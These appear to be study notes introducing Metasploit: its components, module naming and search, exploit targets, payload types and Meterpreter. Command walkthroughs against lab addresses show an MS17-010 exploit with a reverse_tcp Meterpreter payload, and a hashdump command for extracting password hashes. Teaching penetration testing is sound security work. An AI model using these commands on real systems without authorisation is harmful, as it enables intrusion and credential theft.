# Introduction to Metasploit

## Overview
- **Metasploit Framework**: A Ruby-based penetration testing platform.
  - Includes tools for testing security vulnerabilities, network enumeration, exploitation, and post-exploitation.
  - Modular system: Exploits, payloads, and auxiliary tools are easily customizable.
- **Metasploit Pro**: A premium version with additional features:
  - GUI, Social Engineering, Task Chains, Nexpose Integration, and more.

![image](https://github.com/user-attachments/assets/4e8f050d-c88f-41b8-9cf9-58a522858697)


---

## Metasploit Framework Components
### 1. **msfconsole**
- The primary interface for Metasploit Framework.
- Features:
  - Access to all Metasploit options.
  - Tab-completion and command execution.
  - Console-based, stable, and feature-rich.
- Supports:
  - External commands like scanners, payload generators, and social engineering tools.
  - Jobs and sessions for multitasking during assessments.

### 2. **Modules**
- **Categories**:
  - `auxiliary`: Scanners and network enumeration tools.
  - `encoders`: Tools to encode payloads and evade detection.
  - `evasion`: Modules for bypassing security defenses.
  - `exploits`: Proof-of-concept exploits for vulnerabilities.
  - `nops`: Non-operational sleds for shellcode alignment.
  - `payloads`: Code delivered post-exploit.
  - `post`: Tools for post-exploitation activities.
- Path: `/usr/share/metasploit-framework/modules`

### 3. **Plugins**
- Provide additional functionality and automation.
- Examples:
  - `nexpose.rb`: Integration with Nexpose.
  - `pcap_log.rb`: Captures network packets.
  - Path: `/usr/share/metasploit-framework/plugins/`

### 4. **Scripts**
- Enhance Meterpreter capabilities and other utilities.
- Categories:
  - `meterpreter`: Advanced post-exploitation.
  - `resource`: Automates tasks.
  - Path: `/usr/share/metasploit-framework/scripts/`

### 5. **Tools**
- Command-line utilities for development, payload management, and reconnaissance.
- Path: `/usr/share/metasploit-framework/tools/`

---

## Metasploit Pro Features

| **Infiltration**         | **Data Collection**         | **Remediation**               |
|---------------------------|-----------------------------|-------------------------------|
| Manual Exploitation       | Import and Scan Data        | Bruteforce                    |
| Antivirus Evasion         | Discovery Scans             | Task Chains                   |
| IPS/IDS Evasion           | Meta-Modules                | Exploitation Workflow         |
| Proxy Pivot               | Nexpose Scan Integration    | Session Rerun                 |
| Post-Exploitation         |                             | Task Replay                   |
| Session Clean-up          |                             | Project Sonar Integration     |
| Credentials Reuse         |                             | Session Management            |
| Social Engineering        | Credential Management       | Credential Management         |
| Payload Generator         |                             | Team Collaboration            |
| Quick Pen-testing         |                             | Web Interface                 |
| VPN Pivoting              |                             | Backup and Restore            |
| Vulnerability Validation  |                             | Data Export                   |
| Phishing Wizard           |                             | Evidence Collection           |
| Web App Testing           |                             | Reporting                     |
| Persistent Sessions       |                             | Tagging Data                  |


---

## Key Directories
- **Base Files**: `/usr/share/metasploit-framework`
  - `data`: Functionality files.
  - `lib`: Core library files.
  - `documentation`: Technical details about the framework.
- **Modules, Plugins, Scripts, Tools**: Located within the `metasploit-framework` directory.

---

## Conclusion
Metasploit provides a powerful, modular platform for penetration testing, enabling users to exploit vulnerabilities and conduct post-exploitation efficiently. The **msfconsole** is the preferred interface, while plugins, scripts, and tools enhance functionality.


# Introduction to MSFconsole

## What is MSFconsole?
- MSFconsole is the primary interface for the Metasploit Framework.
- Provides centralized, command-line interaction with Metasploit features.
- Key features:
  - Tab-completion for commands.
  - Module management and updates.
  - Access to almost all Metasploit functionalities.

![image](https://github.com/user-attachments/assets/c7f33936-f6a2-4527-b9ef-289e0fec1be3)

---

## Launching MSFconsole

### Basic Command
```bash
msfconsole
```
- Displays the splash art and initializes the console.

### Quiet Mode
```bash
msfconsole -q
```
- Starts MSFconsole without displaying the banner.

### Help Command
- Use the following to view available commands:
```bash
help
```

# Metasploit Modules Overview

## What are Metasploit Modules?
- Prebuilt scripts for specific tasks (e.g., exploitation, payload delivery, post-exploitation).
- Modules include proof-of-concept (POC) exploits for vulnerabilities.
- **Note**: Failure of a module does not mean the vulnerability does not exist; it may require customization.

---

## Module Structure
Modules are structured as:
```bash
<type>/<os>/<service>/<name>
```

### Example
```bash
exploit/windows/ftp/scriptftp_list
```

### Tags
| **Type**        | **Description**                                                                |
|-----------------|--------------------------------------------------------------------------------|
| **Auxiliary**   | Scanning, fuzzing, sniffing, and admin capabilities. Extra assistance tools.   |
| **Encoders**    | Ensure payloads reach their destination intact.                                |
| **Exploits**    | Exploit vulnerabilities for payload delivery.                                  |
| **NOPs**        | (No Operation code) Maintain payload size consistency across exploits.         |
| **Payloads**    | Deliver code that runs remotely, often to establish a shell.                   |
| **Plugins**     | Extend msfconsole functionality for automation or additional features.         |
| **Post**        | Gather information, pivot, or escalate privileges after exploitation.          |

---

## Searching for Modules
- **Command**: `search`
- Use keywords and options to filter results:
  - **Example**:
    ```bash
    search type:exploit platform:windows cve:2021 rank:excellent
    ```

### Search Keywords
| **Keyword**     | **Description**                                               |
|------------------|---------------------------------------------------------------|
| `cve`           | Search by CVE ID                                              |
| `platform`      | Filter by platform (e.g., Windows, Linux)                      |
| `type`          | Module type (e.g., exploit, auxiliary, post)                  |
| `rank`          | Module reliability rank (e.g., excellent, normal)             |
| `name`          | Search by module name                                         |

---

## Using Modules
### Selecting a Module
- Use the **index number** or full path:
  ```bash
  use <module_number>
  ```
- Example:
  ```bash
  use exploit/windows/smb/ms17_010_psexec
  ```

### Viewing Module Options
- Command: `show options`
- Displays required and optional settings for the module.

### Setting Options
- **Temporary setting**:
  ```bash
  set <option_name> <value>
  ```
- **Global setting**:
  ```bash
  setg <option_name> <value>
  ```

---

## Example Workflow
1. **Search for a module**:
   ```bash
   search type:exploit platform:windows cve:2021 rank:excellent
   ```
2. **Select the module**:
   ```bash
   use exploit/windows/smb/ms17_010_psexec
   ```
3. **Set the target IP**:
   ```bash
   set RHOSTS <target_IP>
   ```
4. **Run the exploit**:
   ```bash
   run
   ```

---

## Conclusion
Metasploit modules simplify penetration testing by providing structured and automated tools. Understanding their structure and effective use is essential for successful security assessments.

# Metasploit Targets Overview

## What are Targets?
- Targets are specific operating system versions or configurations that an exploit module is designed to attack.
- They adapt the exploit to a particular OS or service pack.
- Use the `show targets` command within a selected exploit module to list available targets.

---

## Viewing Targets
- If no module is selected:
```bash
msf6 > show targets
[-] No exploit module selected.
```

- Example within a module:
```bash
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

---

## Selecting a Target
- Use the `set target <index no.>` command to choose a specific target.
- Example:

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

```bash
msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6
target => 6
```

---

## Example Exploit: MS12-063 (Microsoft IE Use-After-Free)
- Target selection options:
  - IE 7 on Windows XP SP3
  - IE 8 on Windows XP SP3
  - IE 7 on Windows Vista
  - IE 8 on Windows Vista
  - IE 8 on Windows 7
  - IE 9 on Windows 7
- Use `info` command to understand module functionality and target versions.

---

## Automatic Target Detection
- Leaving the target as `Automatic` allows Metasploit to perform service detection before launching the attack.

---

## Target Types
- Targets vary by:
  - **Service Pack**: Specific OS updates.
  - **OS Version**: Different versions of Windows, Linux, etc.
  - **Language Version**: Language packs can shift memory addresses.
- Key factor: The return address used in the exploit (e.g., `jmp esp` or `pop/pop/ret`).

---

## Advanced Target Identification
- Obtain target binaries to identify suitable return addresses.
- Use `msfpescan` to analyze binaries and locate return addresses.

---

## Conclusion
Understanding targets helps refine exploit usage and improve success rates. Always audit target details to ensure accurate configurations.

#Payloads

# Introduction

A **Payload** in Metasploit refers to a module that assists the exploit module by (typically) returning a shell to the attacker. Payloads are sent alongside the exploit to bypass the standard functioning of the vulnerable service (exploit's job) and then execute on the target system, usually establishing a reverse connection to the attacker and providing initial access (payload's job).

Metasploit Framework has three main types of payload modules: **Singles**, **Stagers**, and **Stages**. The key difference lies in how they are structured and delivered.

## Payload Types

- **Singles**: Contain the entire exploit and the complete payload code. They are self-contained and more stable but can be larger in size.
- **Stagers**: Set up the network connection between the attacker and the victim. Designed to be small and reliable.
- **Stages**: Additional components downloaded by Stagers that provide advanced features like Meterpreter, VNC Injection, etc.

### Staged vs. Non-Staged Payloads

A **staged** payload separates functionality into multiple stages. The initial stage (`Stage0`) establishes the reverse connection and downloads the second stage (`Stage1`) to set up the shell.

A **non-staged** payload combines everything into a single execution.

Examples:
- **Staged**: `windows/meterpreter/reverse_tcp`
- **Non-Staged**: `windows/shell_reverse_tcp`

# Meterpreter

**Meterpreter** is an advanced payload that uses DLL injection to offer:
- Persistence in memory.
- Difficulty of detection through forensic techniques.
- Dynamic loading of scripts and plugins.

Common Meterpreter commands include:
- `getuid`: View the current user.
- `hashdump`: Extract system hashes.
- `screenshot`: Capture screenshots of the target.

# Searching for Payloads

Use the `show payloads` command to list all available payloads in Metasploit. Filter results using `grep` to find specific payloads.

```bash
msf6 > show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
```

## Usage Example

1. Select a payload:
   ```bash
   msf6 > set payload windows/x64/meterpreter/reverse_tcp
   ```
2. Configure the parameters:
   ```bash
   msf6 > set LHOST 10.10.14.15
   msf6 > set RHOSTS 10.10.10.40
   ```
3. Execute the exploit:
   ```bash
   msf6 > run
   ```

# Common Payload Types

| Payload                           | Description                                                              |
|------------------------------------|--------------------------------------------------------------------------|
|generic/custom	                     | Generic listener, multi-use                                              |
|generic/shell_bind_tcp	             | Generic listener, multi-use, normal shell, TCP connection binding        |
|generic/shell_reverse_tcp	         | Generic listener, multi-use, normal shell, reverse TCP connection        |
|windows/x64/exec	                   | Executes an arbitrary command (Windows x64)                              |
|windows/x64/loadlibrary	           | Loads an arbitrary x64 library path                                      |
|windows/x64/messagebox	             | Spawns a dialog via MessageBox using a customizable title, text & icon   |
|windows/x64/shell_reverse_tcp	     | Normal shell, single payload, reverse TCP connection                     |
|windows/x64/shell/reverse_tcp	     | Normal shell, stager + stage, reverse TCP connection                     |
|windows/x64/shell/bind_ipv6_tcp	   | Normal shell, stager + stage, IPv6 Bind TCP stager                       |
|windows/x64/meterpreter/$	         | Meterpreter payload + varieties above                                    |
|windows/x64/powershell/$	           | Interactive PowerShell sessions + varieties above                        |
|windows/x64/vncinject/$	VNC Server | (Reflective Injection) + varieties above                                 |

---

Explore more advanced payloads such as Empire and Cobalt Strike for professional assessments.



